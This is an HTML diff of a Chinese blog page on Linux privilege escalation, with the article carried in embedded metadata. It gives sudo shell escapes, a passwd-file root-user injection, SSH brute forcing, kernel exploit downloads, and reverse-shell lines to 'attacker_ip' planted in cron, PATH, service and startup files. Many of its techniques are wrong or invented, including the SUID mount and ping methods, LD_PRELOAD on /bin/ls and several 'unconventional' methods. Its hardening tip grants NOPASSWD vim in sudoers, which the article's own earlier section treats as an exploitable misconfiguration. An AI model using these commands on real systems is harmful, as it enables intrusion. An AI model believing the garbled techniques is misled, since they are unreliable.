@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="dark">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
-<title>Linux提权 | Cybersecurity learning</title>
+<meta name="robots" content="index, follow">
+<title>Linux提权 | h4xk0r blog</title>
 <meta name="keywords" content="">
 <meta name="description" content="常规提权方式
 一、sudo滥用提权
@@ -90,16 +90,16 @@ sudo /bin/mount /tmp/mount /tmp/mount
 
 利用/bin/ping提权：">
 <meta name="author" content="h4xk0r">
-<link rel="canonical" href="http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/">
+<link rel="canonical" href="https://b1ckdoor.com/posts/linux%E6%8F%90%E6%9D%83/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://b1ckdoor.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://b1ckdoor.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://b1ckdoor.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://b1ckdoor.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://b1ckdoor.com/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/">
+<link rel="alternate" hreflang="en" href="https://b1ckdoor.com/posts/linux%E6%8F%90%E6%9D%83/">
 <noscript>
     <style>
         #theme-toggle,
@@ -114,13 +114,174 @@ sudo /bin/mount /tmp/mount /tmp/mount
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://b1ckdoor.com/posts/linux%E6%8F%90%E6%9D%83/">
+  <meta property="og:site_name" content="h4xk0r blog">
+  <meta property="og:title" content="Linux提权">
+  <meta property="og:description" content="常规提权方式 一、sudo滥用提权 sudo -l提示要输入密码的原因:
+默认SUDO行为 : 需要输入当前用户的密码(不是root)密码
+sudoers配置问题: 未配置免密码访问 在/etc/sudoers文件中没有为当前用户配置NOPASSWD选项
+配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组
+检查当前用户所在组 id username 如果发现在wheel组中,检查wheel组的配置
+查看%wheel相关配置,看是否设置了NOPASSWD或要求密码
+sudo visudo 从wheel组中移除用户
+sudo gpasswd -d username wheel 利用步骤： 查看当前用户sudo权限：
+sudo -l 示例输出：(ALL) NOPASSWD: /usr/bin/vim 利用vim提权：
+sudo /usr/bin/vim 在vim中输入 :set shell=/bin/bash 回车 然后输入 :shell 回车 成功获得root shell 利用其他命令提权：
+如果发现可以执行/usr/bin/nano：
+sudo /usr/bin/nano 在nano中按Ctrl&#43;R，输入!bash，回车 即可获得root shell 说明： sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。
+二、SUID特殊权限提权 利用步骤： 查找SUID文件：
+find / -perm -u=s -type f 2&gt;/dev/null 利用/bin/mount提权：
+mkdir /tmp/mount touch /tmp/mount/malicious_file sudo /bin/mount -o bind /tmp/mount /tmp/mount sudo /bin/mount /tmp/mount /tmp/mount 通过此方式可获取root权限 利用/bin/ping提权：">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-15T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux提权">
+<meta name="twitter:description" content="常规提权方式
+一、sudo滥用提权
+sudo -l提示要输入密码的原因:
+
+
+默认SUDO行为 : 需要输入当前用户的密码(不是root)密码
+
+
+sudoers配置问题: 未配置免密码访问 在/etc/sudoers文件中没有为当前用户配置NOPASSWD选项
+
+
+配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组
+
+检查当前用户所在组
+
+id username 	
+
+
+如果发现在wheel组中,检查wheel组的配置
+查看%wheel相关配置,看是否设置了NOPASSWD或要求密码
+sudo visudo
+
+
+从wheel组中移除用户
+sudo gpasswd -d username wheel
+
+
+
+
+利用步骤：
+
+
+查看当前用户sudo权限：
+sudo -l
+
+示例输出：(ALL) NOPASSWD: /usr/bin/vim
+
+
+
+利用vim提权：
+sudo /usr/bin/vim
+
+在vim中输入 :set shell=/bin/bash 回车
+然后输入 :shell 回车
+成功获得root shell
+
+
+
+利用其他命令提权：
+
+
+如果发现可以执行/usr/bin/nano：
+sudo /usr/bin/nano
+
+在nano中按Ctrl&#43;R，输入!bash，回车
+即可获得root shell
+
+
+
+
+
+说明：
+sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。
+二、SUID特殊权限提权
+利用步骤：
+
+
+查找SUID文件：
+find / -perm -u=s -type f 2&gt;/dev/null
+
+
+利用/bin/mount提权：
+mkdir /tmp/mount
+touch /tmp/mount/malicious_file
+sudo /bin/mount -o bind /tmp/mount /tmp/mount
+sudo /bin/mount /tmp/mount /tmp/mount
+
+通过此方式可获取root权限
+
+
+
+利用/bin/ping提权：">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://b1ckdoor.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Linux提权",
+      "item": "https://b1ckdoor.com/posts/linux%E6%8F%90%E6%9D%83/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Linux提权",
+  "name": "Linux提权",
+  "description": "常规提权方式 一、sudo滥用提权 sudo -l提示要输入密码的原因:\n默认SUDO行为 : 需要输入当前用户的密码(不是root)密码\nsudoers配置问题: 未配置免密码访问 在/etc/sudoers文件中没有为当前用户配置NOPASSWD选项\n配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组\n检查当前用户所在组 id username 如果发现在wheel组中,检查wheel组的配置\n查看%wheel相关配置,看是否设置了NOPASSWD或要求密码\nsudo visudo 从wheel组中移除用户\nsudo gpasswd -d username wheel 利用步骤： 查看当前用户sudo权限：\nsudo -l 示例输出：(ALL) NOPASSWD: /usr/bin/vim 利用vim提权：\nsudo /usr/bin/vim 在vim中输入 :set shell=/bin/bash 回车 然后输入 :shell 回车 成功获得root shell 利用其他命令提权：\n如果发现可以执行/usr/bin/nano：\nsudo /usr/bin/nano 在nano中按Ctrl+R，输入!bash，回车 即可获得root shell 说明： sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。\n二、SUID特殊权限提权 利用步骤： 查找SUID文件：\nfind / -perm -u=s -type f 2\u0026gt;/dev/null 利用/bin/mount提权：\nmkdir /tmp/mount touch /tmp/mount/malicious_file sudo /bin/mount -o bind /tmp/mount /tmp/mount sudo /bin/mount /tmp/mount /tmp/mount 通过此方式可获取root权限 利用/bin/ping提权：\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "常规提权方式 一、sudo滥用提权 sudo -l提示要输入密码的原因:\n默认SUDO行为 : 需要输入当前用户的密码(不是root)密码\nsudoers配置问题: 未配置免密码访问 在/etc/sudoers文件中没有为当前用户配置NOPASSWD选项\n配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组\n检查当前用户所在组 id username 如果发现在wheel组中,检查wheel组的配置\n查看%wheel相关配置,看是否设置了NOPASSWD或要求密码\nsudo visudo 从wheel组中移除用户\nsudo gpasswd -d username wheel 利用步骤： 查看当前用户sudo权限：\nsudo -l 示例输出：(ALL) NOPASSWD: /usr/bin/vim 利用vim提权：\nsudo /usr/bin/vim 在vim中输入 :set shell=/bin/bash 回车 然后输入 :shell 回车 成功获得root shell 利用其他命令提权：\n如果发现可以执行/usr/bin/nano：\nsudo /usr/bin/nano 在nano中按Ctrl+R，输入!bash，回车 即可获得root shell 说明： sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。\n二、SUID特殊权限提权 利用步骤： 查找SUID文件：\nfind / -perm -u=s -type f 2\u003e/dev/null 利用/bin/mount提权：\nmkdir /tmp/mount touch /tmp/mount/malicious_file sudo /bin/mount -o bind /tmp/mount /tmp/mount sudo /bin/mount /tmp/mount /tmp/mount 通过此方式可获取root权限 利用/bin/ping提权：\nping -c 1 127.0.0.1 通过特殊参数（如-c）触发SUID权限 说明： SUID（Set User ID）是文件权限中的一种特殊权限，使执行该文件的用户拥有文件所有者的权限。\n三、passwd文件提权 利用步骤： 查看/etc/passwd文件：\ncat /etc/passwd 查找密码字段为空的用户：\n例如：nobody:x:65534:65534::/home/nobody:/bin/false\n如果密码字段为空（x），则可以直接切换到该用户：\nsu nobody 通过修改/etc/passwd文件提权的详细说明 通过修改/etc/passwd文件写入一个新用户是Linux系统中一种有效的提权方式。这是基于系统配置错误（权限配置不当）的提权方法。 如果/etc/passwd文件中存在密码字段为空的用户，可以直接切换到该用户，无需密码。\n一、提权条件 必须拥有对/etc/passwd文件的写权限（通常只有root用户有写权限） 系统配置错误：/etc/passwd文件的权限设置不当，允许普通用户写入 二、提权步骤 步骤1：赋予/etc/passwd文件写权限（如果当前没有权限） sudo chmod 666 /etc/passwd # 或者 chmod 666 /etc/passwd 注意：如果当前用户没有sudo权限，这一步可能无法完成。在实际渗透测试中，通常需要先通过其他方式获得基本权限。\n步骤2：生成加密密码 使用openssl生成加密密码（MD5或SHA512）：\n# 生成MD5加密的密码（-1表示MD5算法） openssl passwd -1 -salt hacker 123456 # 输出示例：$1$hacker$6luIRwdGpBvXdP.GMwcZp/ # 生成SHA512加密的密码（-6表示SHA512算法） openssl passwd -6 -salt hacker 123456 # 输出示例：$6$hacker$5kX3Zc9yqTz8QmR1aW7eJpKqL7zXwYb0vZnUeR9lMxY0pNtA3jQ 注意：如果使用-1（MD5）算法，需要确保openssl版本支持。早期版本可能不支持-6（SHA512）。\n步骤3：构造新用户条目 新用户的格式遵循/etc/passwd文件的格式：\n用户名:加密密码:UID:GID:描述信息:主目录:shell 对于root权限用户，需要设置：\nUID = 0 GID = 0 主目录 = /root（或任意目录，但通常设置为/root） shell = /bin/bash 示例：\nhacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash 步骤4：将新用户添加到/etc/passwd文件 echo \"hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash\" \u003e\u003e /etc/passwd # 或者 echo \"hacker:$(openssl passwd -1 -salt hacker 123456):0:0:Test User:/root:/bin/bash\" \u003e\u003e /etc/passwd 步骤5：切换到新用户 su hacker # 输入密码：123456 此时，你应该已经获得root权限：\nid # 输出应为：uid=0(root) gid=0(root) groups=0(root) 示例流程 # 赋予passwd文件写权限 chmod 666 /etc/passwd # 生成加密密码 openssl passwd -1 -salt hacker 123456 # $1$hacker$6luIRwdGpBvXdP.GMwcZp/ # 添加新用户到passwd文件 echo \"hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash\" \u003e\u003e /etc/passwd # 切换到新用户 su hacker # 输入密码 123456 # 验证权限 id # 输出: uid=0(root) gid=0(root) groups=0(root) 四、shadow文件提权 利用步骤： 查看/etc/shadow文件：\ncat /etc/shadow 查找密码字段为空的用户：\n例如：nobody::18555:0:99999:7:::\n如果密码字段为空（::），则可以直接切换到该用户：\nsu nobody 说明： /etc/shadow文件存储用户密码哈希，如果密码字段为空，表示该用户无需密码即可登录。\n五、SSH登录密码爆破 利用步骤： 使用hydra进行密码爆破：\nhydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target_ip 如果破解成功，使用SSH登录：\nssh username@target_ip 如果获得root权限，直接使用：\n例如：ssh root@target_ip 说明： 通过暴力破解SSH登录密码，获取系统访问权限。\n六、通过计划任务提权 利用步骤： 查看当前用户的crontab：\ncrontab -l 查看系统级cron任务：\nls /etc/cron.* 如果发现可写cron任务：\n创建恶意脚本：\necho \"bash -i \u003e\u0026 /dev/tcp/attacker_ip/4444 0\u003e\u00261\" \u003e /tmp/malicious.sh chmod +x /tmp/malicious.sh 修改cron任务，使其执行恶意脚本：\ncrontab -e # 添加一行：*/1 * * * * /tmp/malicious.sh 等待cron任务执行，获取shell：\n通过监听端口获取shell：\nnc -lvnp 4444 说明： 计划任务配置不当，低权限用户能修改计划任务执行的程序。\n七、劫持环境变量提权 利用步骤： 查找可写路径：\nfind / -writable -type d 2\u003e/dev/null 将当前目录添加到PATH：\nexport PATH=/tmp:$PATH 创建恶意命令文件：\necho \"bash -i \u003e\u0026 /dev/tcp/attacker_ip/4444 0\u003e\u00261\" \u003e /tmp/ls chmod +x /tmp/ls 执行命令：\nls 系统会优先执行/tmp/ls，获得shell 说明： 通过修改PATH环境变量，使系统优先加载攻击者控制的程序。\n八、利用通配符提权 利用步骤： 查找可写目录：\nfind / -writable -type d 2\u003e/dev/null 创建恶意脚本：\necho \"bash -i \u003e\u0026 /dev/tcp/attacker_ip/4444 0\u003e\u00261\" \u003e /tmp/malicious.sh chmod +x /tmp/malicious.sh 创建符号链接：\nln -s /tmp/malicious.sh /tmp/evil 触发通配符执行：\n如果有程序使用*通配符，如ls *，则会执行恶意脚本 说明： 利用程序在处理通配符时的漏洞，使系统执行恶意代码。\n九、内核CVE漏洞提权 利用步骤： 查看系统信息：\nuname -a 查找匹配的CVE漏洞：\n例如：Linux 4.8.0-58-generic #63~16.04.1-Ubuntu 下载并编译漏洞利用代码：\nwget https://www.exploit-db.com/download/43418 gcc 43418.c -o exploit 执行漏洞利用代码：\n./exploit 说明： 利用Linux内核中的已知漏洞获取root权限。\n其他提权方式 1. Sudo漏洞提权（CVE-2021-3156） 利用步骤：\nsudoedit /etc/passwd 输入#，然后按Enter，触发漏洞 系统会提示输入密码，但不需要输入，直接按Enter即可获得root shell 2. 利用SSH配置错误提权 利用步骤： 查看SSH配置文件：cat /etc/ssh/sshd_config 如果发现AllowUsers或DenyUsers配置不当 通过SSH登录，获取更高权限 3. 利用Web应用提权 利用步骤： 通过Web应用漏洞（如文件包含、命令执行） 执行系统命令，如whoami、id 如果能执行sudo -l，则查看sudo权限 利用发现的sudo权限提权 4. 利用LD_PRELOAD提权 利用步骤：\n创建恶意共享库：\necho 'int main() { system(\"/bin/bash\"); }' \u003e /tmp/exploit.c gcc /tmp/exploit.c -fPIC -shared -o /tmp/libexploit.so 设置环境变量：\nexport LD_PRELOAD=/tmp/libexploit.so 执行命令：\nls 系统会执行恶意库，获得root shell 5. 利用服务配置错误提权 利用步骤：\n查看系统服务：\nsystemctl list-units --type=service 如果发现服务配置不当，低权限用户对服务可执行文件有写权限\n替换为恶意程序：\necho '#!/bin/bash' \u003e /usr/bin/service echo 'bash -i \u003e\u0026 /dev/tcp/attacker_ip/4444 0\u003e\u00261' \u003e\u003e /usr/bin/service chmod +x /usr/bin/service 重启服务，获得shell\nLinux非常规提权方式详解 在Linux系统中，除了常见的SUID、sudo配置错误、内核漏洞提权外，还有一些非常规的提权方式。这些方式往往利用系统设计中不太常见的配置或机制，下面详细介绍这些方法：\n一、利用FUSE (Filesystem in Userspace) 提权 原理 FUSE允许普通用户在用户空间实现文件系统，如果配置不当，可能允许低权限用户挂载具有高权限的文件系统。\n利用步骤 检查FUSE是否可用：\nlsmod | grep fuse 如果输出中包含fuse模块，说明FUSE可用。\n查找FUSE配置文件：\ncat /etc/fuse.conf 重点关注user_allow_other是否启用。\n创建恶意文件系统：\n# 创建一个简单的文件系统 mkdir /tmp/fuse echo '#!/bin/bash' \u003e /tmp/fuse/mount.sh echo 'bash -i \u003e\u0026 /dev/tcp/attacker_ip/4444 0\u003e\u00261' \u003e\u003e /tmp/fuse/mount.sh chmod +x /tmp/fuse/mount.sh 挂载恶意文件系统：\n# 如果user_allow_other已启用 mount -t fuse -o allow_other /tmp/fuse/mount.sh /tmp/mount 系统会执行mount.sh脚本，获取shell 说明 FUSE的allow_other选项允许其他用户访问挂载点，如果配置不当，攻击者可以挂载恶意文件系统并执行任意命令。\n二、利用System V IPC 提权 原理 System V IPC（进程间通信）包括共享内存、消息队列和信号量。如果配置不当，低权限用户可能利用IPC机制提升权限。\n利用步骤 查找可访问的IPC对象：\nipcs -m ipcs -q ipcs -s 尝试修改IPC对象：\n# 例如，修改共享内存 ipcrm -m 利用IPC对象触发漏洞：\n# 假设发现一个共享内存对象 # 创建一个恶意程序，利用该共享内存 # 编译并执行 gcc exploit.c -o exploit ./exploit exploit.c示例 #include #include #include #include int main() { key_t key = ftok(\"/tmp/shm\", 65); int shmid = shmget(key, 1024, IPC_CREAT | 0666); char *shmaddr = shmat(shmid, NULL, 0); // 尝试获取root权限 system(\"chmod 777 /etc/passwd\"); system(\"echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash' \u003e\u003e /etc/passwd\"); return 0; } 说明 通过System V IPC，攻击者可以利用共享内存、消息队列或信号量的配置错误，触发高权限操作。\n三、利用系统日志处理机制提权 原理 某些系统日志处理程序（如rsyslog）在处理日志文件时可能存在权限问题，允许低权限用户执行高权限命令。\n利用步骤 查找日志处理配置：\ngrep -r \"rsyslog\" /etc/ 检查日志文件权限：\nls -l /var/log/syslog 创建恶意日志文件：\necho 'action(type=\"omfwd\" target=\"127.0.0.1\" port=\"514\" protocol=\"tcp\")' \u003e /tmp/rsyslog.conf 触发日志处理：\nlogger \"test\" 如果rsyslog配置允许，可能会执行恶意命令 说明 如果rsyslog配置不当，攻击者可以通过日志文件触发高权限操作。\n四、利用系统时间戳提权 原理 某些系统服务在特定时间点执行高权限操作，攻击者可以通过修改系统时间触发这些操作。\n利用步骤 查看系统时间：\ndate 修改系统时间：\nsudo date -s \"2023-01-01 00:00:00\" 触发服务：\n# 某些服务在特定时间点执行 # 例如，cron任务在特定时间执行 说明 如果系统中有服务在特定时间点执行高权限操作（如备份、日志轮转），修改系统时间可能会触发这些操作。\n五、利用cgroups资源限制提权 原理 cgroups（控制组）用于限制、记录和隔离进程组的资源使用。如果配置不当，可能允许低权限用户提升权限。\n利用步骤 检查cgroups配置：\ncat /proc/self/cgroup 查找可修改的cgroups：\nls /sys/fs/cgroup 修改cgroups配置：\n# 例如，修改内存限制 echo 0 \u003e /sys/fs/cgroup/memory/memory.limit_in_bytes 触发权限提升：\n# 通过修改cgroups配置，触发系统行为变化 说明 通过修改cgroups配置，攻击者可能绕过资源限制，执行高权限操作。\n六、利用网络配置提权 原理 某些网络配置（如iptables规则）可能允许低权限用户执行高权限操作。\n利用步骤 查看iptables规则：\niptables -L 尝试添加规则：\nsudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT 触发高权限操作：\n# 通过修改网络配置，触发服务高权限操作 说明 如果iptables配置不当，攻击者可能通过添加规则触发高权限操作。\n七、利用系统快照和备份机制提权 原理 系统快照和备份机制可能配置不当，允许低权限用户执行高权限操作。\n利用步骤 查找备份文件：\nfind / -name \"*.bak\" 2\u003e/dev/null 修改备份文件：\necho 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash' \u003e\u003e /etc/passwd.bak 触发备份机制：\n# 某些备份程序会将备份文件应用到系统 说明 如果备份机制配置不当，攻击者可能通过修改备份文件，触发系统应用高权限配置。\n八、利用系统服务环境变量提权 原理 某些系统服务在启动时使用环境变量，如果配置不当，攻击者可以设置环境变量触发高权限操作。\n利用步骤 查找系统服务：\nsystemctl list-units --type=service 查看服务配置：\nsystemctl cat 设置环境变量：\nexport SERVICE_ENV_VAR=\"malicious_value\" 触发服务：\nsystemctl restart 说明 通过设置环境变量，攻击者可以触发服务执行高权限操作。\n九、利用系统启动脚本提权 原理 系统启动脚本（如/etc/rc.local）可能配置不当，允许低权限用户在系统启动时执行高权限命令。\n利用步骤 检查启动脚本：\ncat /etc/rc.local 修改启动脚本：\necho \"bash -i \u003e\u0026 /dev/tcp/attacker_ip/4444 0\u003e\u00261\" \u003e\u003e /etc/rc.local 重启系统：\nreboot 说明 通过修改系统启动脚本，攻击者可以在系统启动时获取shell。\n十、利用系统资源管理提权 原理 系统资源管理（如cgroups）可能配置不当，允许低权限用户提升权限。\n利用步骤 查看cgroups配置：\ncat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 修改资源限制：\necho -1 \u003e /sys/fs/cgroup/cpu/cpu.cfs_quota_us 触发权限提升：\n# 通过修改资源限制，触发系统行为变化 说明 通过修改cgroups配置，攻击者可能绕过资源限制，执行高权限操作。\n实战测试优先顺序 在渗透测试中，提权是获取系统控制权的关键环节。以下是我根据实战经验整理的最高频、最实用的提权方式，包括常规和非常规方法，附详细操作步骤和原理说明。\n一、SUID提权 原理 SUID（Set User ID）是一种特殊文件权限，使文件在执行时以文件所有者（通常是root）的权限运行，而不是以执行者权限运行。\n详细操作步骤 查找SUID文件（最常用命令）：\nfind / -perm -u=s -type f 2\u003e/dev/null | grep -E '/bin|/usr/bin' 分析常见SUID文件：\n/bin/mount：最常用 /bin/ping：现代系统可能已修复 /usr/bin/gpasswd：常用 /usr/bin/chage：较少见 利用/bin/mount提权（最可靠）：\n# 创建临时目录 mkdir /tmp/mount touch /tmp/mount/malicious_file # 绑定挂载 /bin/mount -o bind /tmp/mount /tmp/mount # 触发挂载 /bin/mount /tmp/mount /tmp/mount # 检查权限 ls -l /tmp/mount 原理：mount命令以root权限执行，通过bind挂载，将当前用户可写目录挂载到系统目录，实现权限提升 利用/usr/bin/gpasswd提权：\n/usr/bin/gpasswd -a username root 原理：gpasswd允许用户添加自己到root组，无需密码（如果配置正确） 验证提权：\nwhoami # 应该输出：root 实战技巧 优先使用/bin/mount 使用grep过滤：避免输出过多无用信息 不要使用sudo：SUID提权不需要sudo 二、sudo配置错误提权 原理 sudo允许用户以root身份执行特定命令，如果配置不当（NOPASSWD），可直接提权。\n详细操作步骤 查看当前用户sudo权限：\nsudo -l 常见配置错误（重点检查）：\n(ALL) NOPASSWD: ALL：允许执行任意命令 (ALL) NOPASSWD: /usr/bin/vim (ALL) NOPASSWD: /usr/bin/nano (ALL) NOPASSWD: /bin/bash 利用vim提权（最常用）：\nsudo /usr/bin/vim 在vim中输入：\n:set shell=/bin/bash :shell 原理：vim允许设置shell，通过修改shell为/bin/bash，获得root shell\n利用nano提权：\nsudo /usr/bin/nano 按 Ctrl+R，输入 !bash，回车 原理：nano允许执行shell命令，通过!bash获取root shell 验证提权：\nwhoami # 应该输出：root 实战技巧 优先尝试sudo -l：这是最直接的检查方式 sudo -l -n：如果sudo -l需要密码，尝试-n选项（不提示密码） 不要尝试sudo su：如果配置允许，但通常需要密码 三、passwd文件提权 原理 如果/etc/passwd文件对普通用户可写，可以直接添加一个root用户。\n详细操作步骤 检查passwd文件权限：\nls -l /etc/passwd 如果显示为-rw-rw-r--或-rw-rw-rw-，则可写 生成加密密码：\nopenssl passwd -1 -salt hacker 123456 # 输出示例：$1$hacker$6luIRwdGpBvXdP.GMwcZp/ 添加root用户：\necho \"hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash\" \u003e\u003e /etc/passwd 原理：UID 0 表示root用户 切换到新用户：\nsu hacker # 输入密码：123456 验证提权：\nid # 应该输出：uid=0(root) gid=0(root) 实战技巧 优先检查权限：ls -l /etc/passwd是第一步 使用openssl生成密码：避免手动输入错误 如果/etc/passwd不可写： 检查/etc/passwd.bak或/etc/passwd-是否可写 有时系统使用符号链接，修改链接目标 四、内核漏洞提权（实战中需匹配版本) 原理 利用Linux内核中的已知漏洞获取root权限。\n详细操作步骤 获取系统信息：\nuname -a # 示例输出：Linux ubuntu 4.15.0-101-generic #102-Ubuntu SMP Mon Apr 22 20:32:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 使用自动化工具查找漏洞：\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod +x linpeas.sh ./linpeas.sh 关键输出：Kernel version: 4.15.0-101-generic 和 Kernel exploits 下载并编译漏洞利用代码：\n# 以CVE-2016-5195为例 wget https://www.exploit-db.com/download/40653 gcc 40653.c -o exploit 执行漏洞利用代码：\n./exploit 验证提权：\nwhoami # 应该输出：root 实战技巧 优先使用LinPEAS：这是最高效的自动化工具 不要手动搜索CVE：自动化工具能快速定位 内核版本匹配：必须精确匹配系统版本 五、计划任务提权 原理 如果计划任务（cron job）配置不当，低权限用户可以修改计划任务执行的程序。\n详细操作步骤 查看当前用户的cron任务：\ncrontab -l 查看系统级cron任务：\nls /etc/cron.* 查找可写cron任务：\nfind / -writable -type f 2\u003e/dev/null | grep cron 创建恶意脚本：\necho \"bash -i \u003e\u0026 /dev/tcp/attacker_ip/4444 0\u003e\u00261\" \u003e /tmp/malicious.sh chmod +x /tmp/malicious.sh 修改cron任务：\ncrontab -e # 添加一行：*/1 * * * * /tmp/malicious.sh 等待cron任务执行：\nnc -lvnp 4444 # 在攻击机上监听 验证提权：\nwhoami # 应该输出：root 实战技巧 优先检查/etc/cron.d/：系统级cron任务存放位置 利用/etc/cron.daily：每日执行的脚本 不要修改系统级cron：容易被发现 六、LD_PRELOAD提权 原理 LD_PRELOAD环境变量允许在程序执行前加载指定的共享库，如果程序以root权限执行，加载的共享库也会以root权限执行。\n详细操作步骤 创建恶意共享库：\necho 'int main() { system(\"/bin/bash\"); }' \u003e /tmp/exploit.c gcc /tmp/exploit.c -fPIC -shared -o /tmp/libexploit.so 设置环境变量：\nexport LD_PRELOAD=/tmp/libexploit.so 执行SUID程序：\n/bin/ls 原理：/bin/ls通常是SUID root，通过LD_PRELOAD加载恶意库，获得root shell 验证提权：\nwhoami # 应该输出：root 实战技巧 优先检查SUID文件：find / -perm -u=s -type f 2\u003e/dev/null /bin/ls是最常用：几乎所有系统都有SUID版本 不要使用sudo：LD_PRELOAD不需要sudo 总结 自动化工具优先：\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod +x linpeas.sh ./linpeas.sh 这是提权的\"瑞士军刀\"，能快速发现所有提权点 提权顺序：\n先SUID提权 → 再sudo配置错误 → 再passwd文件 → 再内核漏洞 → 再计划任务 安全加固建议（系统管理员必看）：\n# 正确设置passwd权限 chmod 644 /etc/passwd # 正确设置sudoers visudo # 添加：username ALL=(ALL) NOPASSWD: /usr/bin/vim # 定期检查SUID文件 find / -perm -u=s -type f 2\u003e/dev/null ",
+  "wordCount" : "1106",
+  "inLanguage": "en",
+  "datePublished": "2026-02-15T00:00:00Z",
+  "dateModified": "2026-02-15T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "h4xk0r"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://b1ckdoor.com/posts/linux%E6%8F%90%E6%9D%83/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "h4xk0r blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://b1ckdoor.com/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Cybersecurity learning (Alt + H)">Cybersecurity learning</a>
+            <a href="https://b1ckdoor.com/" accesskey="h" title="h4xk0r blog (Alt + H)">h4xk0r blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -146,22 +307,22 @@ sudo /bin/mount /tmp/mount /tmp/mount
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/posts/" title="档案">
+                <a href="https://b1ckdoor.com/posts/" title="档案">
                     <span>档案</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                <a href="https://b1ckdoor.com/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                     <span>搜索</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/categories/" title="分类">
+                <a href="https://b1ckdoor.com/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/fuzzlist/" title="Fuzzlist">
+                <a href="https://b1ckdoor.com/fuzzlist/" title="Fuzzlist">
                     <span>Fuzzlist</span>
                 </a>
             </li>
@@ -1467,12 +1628,26 @@ sudo /bin/mount /tmp/mount /tmp/mount
   <footer class="post-footer">
     <ul class="post-tags">
     </ul>
-  </footer>
+  </footer><script src="https://giscus.app/client.js"
+        data-repo="h4xk0r/h4xk0r.github.io"
+        data-repo-id="R_kgDORE9_Hw"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORE9_H84C9ILE"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
